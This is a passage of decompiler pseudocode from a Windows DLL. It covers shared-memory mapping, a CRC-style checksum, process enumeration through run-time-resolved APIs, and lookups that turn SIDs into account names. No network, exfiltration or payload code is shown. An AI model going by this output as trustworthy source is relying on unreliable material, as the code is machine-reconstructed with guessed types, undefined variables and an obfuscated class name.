  v21 = (HANDLE *)(a1 + 4);
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  sub_10011AF4(a1 + 4, (void *)0xFFFFFFFF, 0, 0, v5, CurrentProcessId);
  GetCurrentProcessId();
  GetCurrentProcessId();
  *(_DWORD *)(a1 + 16) = 0;
  v19 = a1 + 12;
  *(_DWORD *)(a1 + 12) = off_101025E4;
  sub_10011F23(a1 + 12, 0, 0);
  LOBYTE(v23) = 2;
  *(_BYTE *)(a1 + 20) = 0;
  v6 = &a4;
  if ( (_BYTE)lpName )
  {
    v6 = sub_10022A79(v17, &a4);
    LOBYTE(v23) = 3;
    v22 = 1;
  }
  sub_1000D372(v18, (int)v6);
  v23 = 5;
  if ( (v22 & 1) != 0 )
  {
    v22 &= ~1u;
    sub_1000D3AD(v17);
  }
  SetLastError(0);
  v7 = sub_1000B87D(v16);
  LOBYTE(v23) = 6;
  lpNamea = *(const WCHAR **)(v18[1] + 12);
  lpFileMappingAttributes = *(LPSECURITY_ATTRIBUTES *)(*v7 + 4);
  v14 = GetCurrentProcessId();
  v12 = GetCurrentProcessId();
  FileMappingW = CreateFileMappingW((HANDLE)0xFFFFFFFF, lpFileMappingAttributes, 4u, 0, dwMaximumSizeLow, lpNamea);
  sub_1000A198(v21, FileMappingW, 0, 0, v12, v14);
  LOBYTE(v23) = 5;
  sub_10007D7A(v16);
  if ( !*(_DWORD *)(a1 + 8) )
    goto LABEL_6;
  if ( GetLastError() != 183 )
  {
    SetLastError(0);
    *(_BYTE *)(a1 + 20) = 1;
  }
  v9 = *(void **)(a1 + 8);
  GetCurrentProcessId();
  GetCurrentProcessId();
  v10 = MapViewOfFile(v9, 0xF001Fu, 0, 0, dwMaximumSizeLow);
  sub_10011F23(v19, (int)v10, 0);
  if ( !*(_DWORD *)(a1 + 16) )
  {
LABEL_6:
    sub_1000E9DF(&pExceptionObject, 1, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  LOBYTE(v23) = 2;
  sub_1000D3AD(v18);
  v23 = -1;
  sub_1000D3AD(&a4);
  return a1;
}
// 101025E4: using guessed type int (__thiscall *off_101025E4[6])(void *Block, char);
// 10102DF4: using guessed type int (__thiscall *off_10102DF4[2])(void *Block, char);

//----- (100206C4) --------------------------------------------------------
_DWORD *__thiscall sub_100206C4(_DWORD *Block, char a2)
{
  sub_100206E3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100206E3) --------------------------------------------------------
bool __thiscall sub_100206E3(_DWORD *this)
{
  *this = off_10102DF4;
  sub_10011EE4(this + 3);
  return sub_1000A159(this + 1);
}
// 10102DF4: using guessed type int (__thiscall *off_10102DF4[2])(void *Block, char);

//----- (1002071F) --------------------------------------------------------
int __stdcall sub_1002071F(int a1, int a2, int a3, int a4)
{
  sub_1000D372((_DWORD *)(a1 + 4), (int)&a3);
  *(_DWORD *)(a1 + 12) = a2;
  sub_1000D3AD(&a3);
  return a1;
}

//----- (10020765) --------------------------------------------------------
_DWORD *__stdcall sub_10020765(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 4);
  return a2;
}

//----- (1002079F) --------------------------------------------------------
_DWORD *__thiscall sub_1002079F(void *this, _DWORD *a2)
{
  sub_100201A0(this, (int)a2, 0);
  *a2 = &off_10102DF8;
  sub_10019445((int)(a2 + 4));
  return a2;
}
// 10102DF8: using guessed type int (__thiscall *off_10102DF8)(void *Block, char);

//----- (100207DE) --------------------------------------------------------
_BYTE *__thiscall sub_100207DE(_BYTE *Block, char a2)
{
  sub_100207FD(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100207FD) --------------------------------------------------------
void *__thiscall sub_100207FD(_BYTE *this)
{
  int v2; // [esp+0h] [ebp-20h] BYREF
  _BYTE *v3; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  v3 = this;
  *(_DWORD *)this = &off_10102DF8;
  v5 = 1;
  sub_10020227(this);
  v5 = -1;
  return sub_100201D0(v3);
}
// 10102DF8: using guessed type int (__thiscall *off_10102DF8)(void *Block, char);

//----- (1002084E) --------------------------------------------------------
int __thiscall sub_1002084E(_DWORD *this, char *a2)
{
  int v3; // eax
  int result; // eax
  char v5; // dl
  int v6; // edi
  unsigned int v7; // ecx

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 44))(this);
  result = (*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 16))(v3, a2);
  if ( result == 1 )
  {
    v5 = *a2;
    v6 = this[5];
    v7 = ~this[6];
    this[6] = v7;
    this[6] = ~(*(_DWORD *)(v6 + 4 * (unsigned __int8)(v7 ^ v5)) ^ (v7 >> 8));
  }
  return result;
}

//----- (10020891) --------------------------------------------------------
int __thiscall sub_10020891(void *this, _DWORD *a2)
{
  int v3; // eax
  int v4; // eax
  int v5; // edi
  _DWORD *v6; // eax
  int v8[5]; // [esp+Ch] [ebp-20h] BYREF
  int v9; // [esp+28h] [ebp-4h]

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v4 = (*(int (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, a2);
  v5 = v4;
  if ( v4 )
  {
    v6 = (_DWORD *)sub_1000B6B7(a2, (int)v8, 0, v4);
    v9 = 0;
    sub_10019459(v6, (int)this + 16);
    v9 = -1;
    sub_1000B3DF(v8);
  }
  return v5;
}
// 10020891: using guessed type int var_20[5];

//----- (100208F2) --------------------------------------------------------
int __thiscall sub_100208F2(_DWORD *this)
{
  return this[6];
}

//----- (100208F6) --------------------------------------------------------
char sub_100208F6()
{
  return 0;
}

//----- (100208F9) --------------------------------------------------------
_BYTE *__thiscall sub_100208F9(_BYTE *Block, char a2)
{
  sub_10020918(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020918) --------------------------------------------------------
int __thiscall sub_10020918(_BYTE *this)
{
  int v2; // [esp+0h] [ebp-20h] BYREF
  _BYTE *v3; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  v3 = this;
  *(_DWORD *)this = &off_10102E30;
  v5 = 1;
  sub_100203B7(this);
  v5 = -1;
  return sub_1002036C(v3);
}
// 10102E30: using guessed type int (__thiscall *off_10102E30)(void *Block, char);

//----- (10020969) --------------------------------------------------------
int __thiscall sub_10020969(_DWORD *this, int a2)
{
  int v3; // eax
  int v4; // ecx
  unsigned int v5; // eax
  int result; // eax

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 16))(v3, a2);
  v4 = this[5];
  v5 = ~this[6];
  this[6] = v5;
  result = ~(*(_DWORD *)(v4 + 4 * (unsigned __int8)(v5 ^ a2)) ^ (v5 >> 8));
  this[6] = result;
  return result;
}

//----- (100209A4) --------------------------------------------------------
int __thiscall sub_100209A4(void *this, _DWORD *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, a2);
  return sub_10019459(a2, (int)this + 16);
}

//----- (100209C9) --------------------------------------------------------
void __thiscall sub_100209C9(_DWORD *this)
{
  *this = &off_10102A68;
  sub_1000E843(this);
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (100209F2) --------------------------------------------------------
_DWORD *__stdcall sub_100209F2(_DWORD *a1)
{
  sub_100245AE(a1);
  *a1 = &off_10102888;
  return a1;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10020A26) --------------------------------------------------------
int __stdcall sub_10020A26(int a1, int a2)
{
  int v3[2]; // [esp+4h] [ebp-1Ch] BYREF
  int v4; // [esp+Ch] [ebp-14h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = 0;
  sub_1000D372(v3, a2);
  v5 = 3;
  sub_10021516(a1, (int)v3);
  v4 = 2;
  LOBYTE(v5) = 0;
  sub_1000D3AD(v3);
  return a1;
}

//----- (10020A7A) --------------------------------------------------------
char __userpurge sub_10020A7A@<al>(int *a1@<edi>, int a2)
{
  int v2; // eax
  char v3; // bl
  int v5[3]; // [esp+4h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  v5[2] = 0;
  sub_1000D372(v5, a2);
  v6 = 2;
  v2 = sub_10020B19(a1);
  v3 = (*(int (__thiscall **)(int, int *, _DWORD))(*(_DWORD *)v2 + 4))(v2, v5, 0);
  v6 = -1;
  sub_1000D3AD(v5);
  return v3;
}

//----- (10020AD0) --------------------------------------------------------
void __thiscall sub_10020AD0(int *this, int a2, volatile LONG *lpAddend)
{
  int v4; // edi
  volatile LONG *v5; // [esp-4h] [ebp-18h]

  v4 = a2;
  if ( *this != a2 )
  {
    sub_10040447((int)this);
    v5 = lpAddend;
    this[1] = (int)lpAddend;
    *this = v4;
    InterlockedIncrement(v5);
  }
  sub_10020B81(&a2);
}

//----- (10020B19) --------------------------------------------------------
int __usercall sub_10020B19@<eax>(int *a1@<edi>)
{
  _DWORD *v1; // eax
  volatile LONG *v2; // ecx
  volatile LONG *v4; // [esp-8h] [ebp-1Ch] BYREF
  volatile LONG *v5; // [esp-4h] [ebp-18h]
  void *Block; // [esp+4h] [ebp-10h]
  int v7; // [esp+10h] [ebp-4h]

  if ( !*a1 )
  {
    v1 = operator new(8u);
    v2 = v5;
    Block = v1;
    v7 = 0;
    if ( v1 )
    {
      *v1 = &off_10102A30;
      v1[1] = 983103;
    }
    else
    {
      v1 = 0;
    }
    v7 = -1;
    v5 = v2;
    v4 = v2;
    Block = &v4;
    sub_10050B91(&v4, (int)v1);
    v7 = -1;
    sub_10020AD0(a1, (int)v4, v5);
  }
  return *a1;
}
// 10102A30: using guessed type int (__thiscall *off_10102A30)(void *Block, char);

//----- (10020B81) --------------------------------------------------------
void __thiscall sub_10020B81(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10040447((int)this);
}

//----- (10020BBA) --------------------------------------------------------
_DWORD *__stdcall sub_10020BBA(_DWORD *a1, int a2, int a3)
{
  *a1 = off_10102E64;
  sub_1000D372(a1 + 1, a2);
  sub_1000D372(a1 + 3, a3);
  sub_10020D6E(a1 + 5, (int)(a1 + 1), (int)(a1 + 3), 0);
  sub_10020D6E(a1 + 12, (int)(a1 + 1), (int)(a1 + 3), *(_DWORD *)(a1[2] + 28));
  return a1;
}
// 10102E64: using guessed type int (__thiscall *off_10102E64[4])(void *Block, char);

//----- (10020C2A) --------------------------------------------------------
int *__thiscall sub_10020C2A(int *Block, char a2)
{
  sub_10020C49(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10020C49) --------------------------------------------------------
void __thiscall sub_10020C49(int *this)
{
  *this = (int)off_10102E64;
  sub_100511C9(this + 12);
  sub_100511C9(this + 5);
  sub_1000D3AD(this + 3);
  sub_1000D3AD(this + 1);
}
// 10102E64: using guessed type int (__thiscall *off_10102E64[4])(void *Block, char);

//----- (10020CA0) --------------------------------------------------------
_DWORD *__thiscall sub_10020CA0(void *this, _DWORD *a2)
{
  sub_10020D14((int)this + 20, a2);
  return a2;
}

//----- (10020CDA) --------------------------------------------------------
_DWORD *__thiscall sub_10020CDA(void *this, _DWORD *a2)
{
  sub_10020D14((int)this + 48, a2);
  return a2;
}

//----- (10020D14) --------------------------------------------------------
_DWORD *__userpurge sub_10020D14@<eax>(int a1@<edi>, _DWORD *a2)
{
  int v2; // edx

  *a2 = off_10104488;
  sub_1000D372(a2 + 1, a1 + 4);
  sub_1000D372(a2 + 3, a1 + 12);
  a2[5] = *(_DWORD *)(a1 + 20);
  a2[6] = sub_10020E8F(v2, a2);
  return a2;
}
// 10020D51: variable 'v2' is possibly undefined
// 10104488: using guessed type int (__thiscall *off_10104488[2])(void *Block, char);

//----- (10020D6E) --------------------------------------------------------
_DWORD *__stdcall sub_10020D6E(_DWORD *a1, int a2, int a3, int a4)
{
  int v4; // edx

  *a1 = off_10104488;
  sub_1000D372(a1 + 1, a2);
  sub_1000D372(a1 + 3, a3);
  a1[5] = a4;
  a1[6] = sub_10020E8F(v4, a1);
  return a1;
}
// 10020DA8: variable 'v4' is possibly undefined
// 10104488: using guessed type int (__thiscall *off_10104488[2])(void *Block, char);

//----- (10020DC5) --------------------------------------------------------
_DWORD *__usercall sub_10020DC5@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  unsigned int v3; // eax
  int v4; // ecx

  v3 = a1[6];
  v4 = a1[2];
  a1[5] = v3;
  if ( v3 < *(_DWORD *)(v4 + 28) )
  {
    a1[5] = v3 + 1;
    a1[6] = sub_10020E8F(a2, a1);
  }
  return a1;
}

//----- (10020DE6) --------------------------------------------------------
_DWORD *__thiscall sub_10020DE6(_DWORD *this, _DWORD *a2)
{
  rsize_t v3; // edi
  int v4; // ecx
  wchar_t *v5; // eax
  _DWORD *v6; // eax
  wchar_t *v7; // eax
  unsigned int v9; // [esp-Ch] [ebp-4Ch]
  const wchar_t *v10; // [esp-8h] [ebp-48h]
  int v11[5]; // [esp+Ch] [ebp-34h] BYREF
  int v12[3]; // [esp+20h] [ebp-20h] BYREF
  int v13; // [esp+2Ch] [ebp-14h]
  int v14; // [esp+30h] [ebp-10h]
  int v15; // [esp+3Ch] [ebp-4h]

  v13 = 0;
  v3 = this[6] - this[5];
  v14 = this[5];
  sub_1000B1F3((void *)(2 * v3 + 2), (int)v11, 0);
  v15 = 1;
  v10 = (const wchar_t *)(*(_DWORD *)(this[2] + 12) + 2 * v14);
  v9 = (unsigned int)v11[3] >> 1;
  v5 = (wchar_t *)sub_1000B49B(v11, v4);
  if ( wcsncpy_s(v5, v9, v10, v3) )
  {
    v6 = sub_1000E9DF(v12, 1, 1);
    LOBYTE(v15) = 2;
    sub_1000A947(v6, 109);
  }
  v7 = (wchar_t *)sub_1000B4B8(v11);
  sub_1000D17D(a2, v7);
  v13 = 1;
  LOBYTE(v15) = 0;
  sub_1000B3DF(v11);
  return a2;
}
// 10020E33: variable 'v4' is possibly undefined
// 10020DE6: using guessed type int var_20[3];

//----- (10020E8F) --------------------------------------------------------
unsigned int __usercall sub_10020E8F@<eax>(int a1@<edx>, _DWORD *a2@<esi>)
{
  unsigned int i; // edi
  const wchar_t *v3; // ebx
  __int16 v4; // ax

  for ( i = a2[5]; i < *(_DWORD *)(a2[2] + 28); ++i )
  {
    v3 = *(const wchar_t **)(a2[4] + 12);
    v4 = sub_1000D45C(i, a1, (int)(a2 + 1));
    if ( wcschr(v3, v4) )
      break;
  }
  return i;
}
// 10020EA3: variable 'a1' is possibly undefined

//----- (10020EC4) --------------------------------------------------------
bool __usercall sub_10020EC4@<al>(int a1@<edi>, int a2@<esi>)
{
  return a1 == a2
      || *(_DWORD *)(a1 + 20) == *(_DWORD *)(a2 + 20)
      && !sub_1000D65C(a2 + 4, a1 + 4)
      && !sub_1000D65C(a2 + 12, a1 + 12);
}

//----- (10020EF4) --------------------------------------------------------
_DWORD *__stdcall sub_10020EF4(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 8);
  return a2;
}

//----- (10020F2E) --------------------------------------------------------
_DWORD *__cdecl sub_10020F2E(_DWORD *a1)
{
  DWORD v1; // ecx
  void *v2; // eax
  char *v3; // esi
  _DWORD *v4; // eax
  int v5; // eax
  DWORD v7; // [esp-8h] [ebp-28Ch] BYREF
  DWORD CurrentProcessId; // [esp-4h] [ebp-288h]
  int v9[9]; // [esp+Ch] [ebp-278h] BYREF
  wchar_t String[264]; // [esp+30h] [ebp-254h] BYREF
  int v11[2]; // [esp+240h] [ebp-44h] BYREF
  int v12; // [esp+248h] [ebp-3Ch] BYREF
  int v13; // [esp+250h] [ebp-34h]
  int v14; // [esp+254h] [ebp-30h] BYREF
  char *v15; // [esp+258h] [ebp-2Ch]
  int v16[2]; // [esp+25Ch] [ebp-28h] BYREF
  char *v17; // [esp+264h] [ebp-20h]
  void *v18; // [esp+270h] [ebp-14h]
  bool v19; // [esp+277h] [ebp-Dh]
  int v20; // [esp+280h] [ebp-4h]

  v20 = 0;
  CurrentProcessId = v1;
  v7 = v1;
  v13 = 0;
  v18 = &v7;
  sub_1000D372(&v7, (int)&unk_101869C8);
  v20 = 0;
  v15 = sub_1001E665((int)&unk_101869D8);
  v18 = &v7;
  sub_1000D372(&v7, (int)&unk_101869B0);
  v20 = 0;
  v17 = sub_1001E665((int)&unk_101869D8);
  v18 = &v7;
  sub_1000D372(&v7, (int)&unk_101869B8);
  v20 = 0;
  v18 = sub_1001E665((int)&unk_101869D8);
  CurrentProcessId = GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  v2 = (void *)((int (__stdcall *)(int, _DWORD))v15)(2, 0);
  sub_10011AF4((int)&v14, v2, 0, 0, v7, CurrentProcessId);
  v20 = 4;
  v3 = v15;
  if ( v15 == (char *)-1 || !v15 )
  {
    v4 = sub_1000E9DF(v16, 1, 1);
    LOBYTE(v20) = 5;
    CurrentProcessId = 88;
    goto LABEL_4;
  }
  sub_1001BAF3(a1);
  v13 = 1;
  v9[0] = 556;
  if ( ((int (__stdcall *)(char *, int *))v17)(v3, v9) == 1 )
  {
    while ( 1 )
    {
      sub_1000D17D(v16, String);
      LOBYTE(v20) = 8;
      v11[1] = v9[6];
      v11[0] = v9[2];
      sub_1000D372(&v12, (int)v16);
      LOBYTE(v20) = 4;
      sub_1000D3AD(v16);
      LOBYTE(v20) = 10;
      sub_10052660(a1, (int)v11);
      v5 = ((int (__stdcall *)(char *, int *))v18)(v3, v9);
      v19 = v5 != 1;
      if ( v5 != 1 && GetLastError() != 18 )
        break;
      LOBYTE(v20) = 4;
      sub_1001BDAA((int)v11);
      if ( v19 )
        goto LABEL_11;
    }
    v4 = sub_1000E9DF(v16, 1, 1);
    LOBYTE(v20) = 11;
    CurrentProcessId = 117;
LABEL_4:
    sub_1000A947(v4, CurrentProcessId);
  }
  if ( GetLastError() != 18 )
  {
    v4 = sub_1000E9DF(v16, 1, 1);
    LOBYTE(v20) = 6;
    CurrentProcessId = 99;
    goto LABEL_4;
  }
LABEL_11:
  LOBYTE(v20) = 0;
  sub_1000A159(&v14);
  return a1;
}
// 10020F46: variable 'v1' is possibly undefined
// 10020F2E: using guessed type wchar_t String[264];

//----- (1002110D) --------------------------------------------------------
DWORD __cdecl sub_1002110D(DWORD dwProcessId)
{
  _DWORD *v1; // eax
  int v3[3]; // [esp+0h] [ebp-1Ch] BYREF
  DWORD pSessionId[4]; // [esp+Ch] [ebp-10h] BYREF

  if ( !ProcessIdToSessionId(dwProcessId, pSessionId) )
  {
    v1 = sub_1000E9DF(v3, 1, 1);
    pSessionId[3] = 0;
    sub_1000A947(v1, 127);
  }
  return pSessionId[0];
}
// 1002110D: using guessed type int var_1C[3];

//----- (10021152) --------------------------------------------------------
void **__thiscall sub_10021152(void **Block, char a2)
{
  sub_1002124C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021171) --------------------------------------------------------
int __stdcall sub_10021171(int a1, unsigned __int8 *Src)
{
  *(_DWORD *)a1 = off_10102E68;
  sub_10050B91((_DWORD *)(a1 + 4), 0);
  sub_100211B4((void **)a1, Src);
  return a1;
}
// 10102E68: using guessed type int (__thiscall *off_10102E68[3])(void *Block, char);

//----- (100211B4) --------------------------------------------------------
void __thiscall sub_100211B4(void **this, unsigned __int8 *Src)
{
  size_t v3; // ebx
  void *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  void *v7[2]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h]

  if ( Src )
  {
    v3 = 4 * Src[1] + 8;
    v4 = operator new(v3);
    v5 = sub_10050B91(v7, (int)v4);
    v8 = 0;
    sub_100214CD((int)(this + 1), v5);
    v8 = -1;
    sub_10021494(v7);
    memcpy(this[1], Src, v3);
  }
  else
  {
    v6 = sub_10050B91(v7, 0);
    v8 = 1;
    sub_100214CD((int)(this + 1), v6);
    v8 = -1;
    sub_10021494(v7);
  }
}

//----- (1002124C) --------------------------------------------------------
void __thiscall sub_1002124C(void **this)
{
  *this = off_10102E68;
  sub_10021494(this + 1);
}
// 10102E68: using guessed type int (__thiscall *off_10102E68[3])(void *Block, char);

//----- (10021278) --------------------------------------------------------
_DWORD *__stdcall sub_10021278(DWORD cchReferencedDomainName, _DWORD *a2)
{
  void *v2; // esi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  wchar_t *v6; // eax
  _DWORD *v7; // eax
  int v9; // [esp+Ch] [ebp-44h] BYREF
  int v10[2]; // [esp+10h] [ebp-40h] BYREF
  PSID Sid; // [esp+18h] [ebp-38h] BYREF
  volatile LONG *v12; // [esp+1Ch] [ebp-34h]
  int v13[2]; // [esp+20h] [ebp-30h] BYREF
  int v14[2]; // [esp+28h] [ebp-28h] BYREF
  int v15; // [esp+30h] [ebp-20h]
  int v16; // [esp+34h] [ebp-1Ch] BYREF
  LPWSTR ReferencedDomainName; // [esp+38h] [ebp-18h]
  enum _SID_NAME_USE peUse; // [esp+3Ch] [ebp-14h] BYREF
  DWORD cchName; // [esp+40h] [ebp-10h] BYREF
  int v20; // [esp+4Ch] [ebp-4h]

  v15 = 0;
  v12 = *(volatile LONG **)(cchReferencedDomainName + 8);
  v2 = *(void **)(cchReferencedDomainName + 4);
  cchName = 0;
  cchReferencedDomainName = 0;
  peUse = SidTypeInvalid;
  Sid = v2;
  InterlockedIncrement(v12);
  v20 = 1;
  if ( LookupAccountSidW(0, v2, 0, &cchName, 0, &cchReferencedDomainName, &peUse) )
  {
    v3 = sub_1000E9DF(&v9, 1, 1);
    LOBYTE(v20) = 2;
    sub_1000A947(v3, 68);
  }
  if ( GetLastError() != 122 )
  {
    v4 = sub_1000E9DF(&v9, 1, 1);
    LOBYTE(v20) = 3;
    sub_1000A947(v4, 69);
  }
  sub_1000D1D6(v13, cchName);
  LOBYTE(v20) = 4;
  sub_1000D1D6(v14, cchReferencedDomainName);
  LOBYTE(v20) = 5;
  sub_1000D4A1(v14);
  ReferencedDomainName = *(LPWSTR *)(v14[1] + 12);
  sub_1000D4A1(v13);
  if ( !LookupAccountSidW(
          0,
          Sid,
          *(LPWSTR *)(v13[1] + 12),
          &cchName,
          ReferencedDomainName,
          &cchReferencedDomainName,
          &peUse) )
  {
    v5 = sub_1000E9DF(&v9, 1, 1);
    LOBYTE(v20) = 6;
    sub_1000A947(v5, 75);
  }
  sub_1000D6AC((int)v13);
  sub_1000D6AC((int)v14);
  v6 = (wchar_t *)sub_1000CC40((int)&unk_101791C0);
  sub_1000D17D(&v16, v6);
  LOBYTE(v20) = 7;
  v7 = sub_1000D5FF(v10, (int)v14, &v16);
  LOBYTE(v20) = 8;
  sub_1000D5FF(a2, (int)v7, v13);
  v15 = 1;
  LOBYTE(v20) = 7;
  sub_1000D3AD(v10);
  LOBYTE(v20) = 5;
  sub_1000D3AD(&v16);
  LOBYTE(v20) = 4;
  sub_1000D3AD(v14);
  LOBYTE(v20) = 1;
  sub_1000D3AD(v13);
  LOBYTE(v20) = 0;
  sub_10021494(&Sid);
  return a2;
}

//----- (10021411) --------------------------------------------------------
_DWORD *__stdcall sub_10021411(int a1, _DWORD *a2)
{
  _DWORD *v2; // eax
  int v4[3]; // [esp+4h] [ebp-24h] BYREF
  int v5; // [esp+10h] [ebp-18h] BYREF
  LPWSTR StringSid; // [esp+14h] [ebp-14h] BYREF
  int v7; // [esp+18h] [ebp-10h]
  int v8; // [esp+24h] [ebp-4h]

  v7 = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011BB7(&v5);
  v8 = 1;
  if ( !ConvertSidToStringSidW(*(PSID *)(a1 + 4), &StringSid) )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    LOBYTE(v8) = 2;
    sub_1000A947(v2, 131);
  }
  sub_1000D17D(a2, StringSid);
  v7 = 1;
  LOBYTE(v8) = 0;
  sub_10011E1D(&v5);
  return a2;
}
// 10021411: using guessed type int var_24[3];

//----- (10021494) --------------------------------------------------------
void __thiscall sub_10021494(void **this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100214F2(this);
}

//----- (100214CD) --------------------------------------------------------
int __usercall sub_100214CD@<eax>(int a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *(_DWORD *)a1 != *a2 )
  {
    sub_100214F2((void **)a1);
    *(_DWORD *)(a1 + 4) = a2[1];
    v4 = *(volatile LONG **)(a1 + 4);
    *(_DWORD *)a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (100214F2) --------------------------------------------------------
void __usercall sub_100214F2(void **a1@<esi>)
{
  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    j__free(*a1);
  }
}

//----- (10021516) --------------------------------------------------------
int __stdcall sub_10021516(int a1, int a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v5; // [esp-4h] [ebp-1Ch]

  v5 = a2;
  *(_DWORD *)a1 = off_10102E6C;
  sub_1000D372((_DWORD *)(a1 + 4), v5);
  *(_BYTE *)(a1 + 12) = 0;
  sub_1001C041((int)&a2 + 3);
  v2 = sub_10020B19((int *)dword_1017E02C);
  if ( !(*(unsigned __int8 (__thiscall **)(int, int, _DWORD))(*(_DWORD *)v2 + 4))(v2, a2, *(unsigned __int8 *)(a1 + 12)) )
  {
    SetLastError(2u);
    v3 = sub_100209F2(&a2);
    sub_1001A90A((int)v3);
  }
  return a1;
}
// 10102E6C: using guessed type int (__thiscall *off_10102E6C[2])(void *Block, char);
// 1017E02C: using guessed type int dword_1017E02C;

//----- (1002159A) --------------------------------------------------------
int *__thiscall sub_1002159A(int *Block, char a2)
{
  sub_100215F9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100215B9) --------------------------------------------------------
int __userpurge sub_100215B9@<eax>(int a1@<edi>, int a2)
{
  *(_DWORD *)a2 = off_10102E6C;
  sub_1000D372((_DWORD *)(a2 + 4), a1 + 4);
  *(_BYTE *)(a2 + 12) = *(_BYTE *)(a1 + 12);
  return a2;
}
// 10102E6C: using guessed type int (__thiscall *off_10102E6C[2])(void *Block, char);

//----- (100215F9) --------------------------------------------------------
void __thiscall sub_100215F9(int *this)
{
  *this = (int)off_10102E6C;
  sub_1000D3AD(this + 1);
}
// 10102E6C: using guessed type int (__thiscall *off_10102E6C[2])(void *Block, char);

//----- (10021625) --------------------------------------------------------
char __thiscall sub_10021625(unsigned __int8 *this, int a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6[2]; // [esp+Ch] [ebp-14h] BYREF
  int v7; // [esp+1Ch] [ebp-4h]

  sub_1001C041((int)&a2 + 3);
  v3 = sub_10020B19((int *)dword_1017E02C);
  v4 = sub_10020765((int)this, v6);
  v7 = 0;
  LOBYTE(this) = (*(int (__thiscall **)(int, _DWORD *, int, _DWORD))(*(_DWORD *)v3 + 32))(v3, v4, a2, this[12]);
  v7 = -1;
  sub_1000D3AD(v6);
  return (char)this;
}
// 1017E02C: using guessed type int dword_1017E02C;

//----- (1002168B) --------------------------------------------------------
int __thiscall sub_1002168B(char *this, int a2, int a3)
{
  sub_10022F50(this, a2, a3, this[12]);
  return a2;
}

//----- (100216C6) --------------------------------------------------------
_DWORD *__stdcall sub_100216C6(_DWORD *a1)
{
  sub_1001EC12((int)a1);
  a1[9] = off_100FBF5C;
  a1[9] = &off_10102EC0;
  a1[10] = 0;
  a1[11] = 0;
  a1[12] = 0;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102EC0: using guessed type int (__thiscall *off_10102EC0)(void *Block, char);

//----- (10021714) --------------------------------------------------------
int __thiscall sub_10021714(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v6[2]; // [esp+8h] [ebp-20h] BYREF
  _DWORD *v7[3]; // [esp+10h] [ebp-18h] BYREF
  int v8; // [esp+24h] [ebp-4h]

  sub_1000EDE4(this, v7);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v6);
  LOBYTE(v8) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
      sub_100234F6(*(_DWORD **)(v4 + 12));
    }
    sub_10021F56(v3, v6[0]);
  }
  LOBYTE(v8) = 0;
  sub_10020B81(v6);
  v8 = -1;
  return sub_1000EDA4(v7);
}
// 10021780: variable 'v3' is possibly undefined

//----- (100217C1) --------------------------------------------------------
int __thiscall sub_100217C1(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  _DWORD *v6[2]; // [esp+8h] [ebp-1Ch] BYREF
  int v7[2]; // [esp+10h] [ebp-14h] BYREF
  int v8; // [esp+20h] [ebp-4h]

  sub_1000EDE4(this, v6);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v7);
  LOBYTE(v8) = 1;
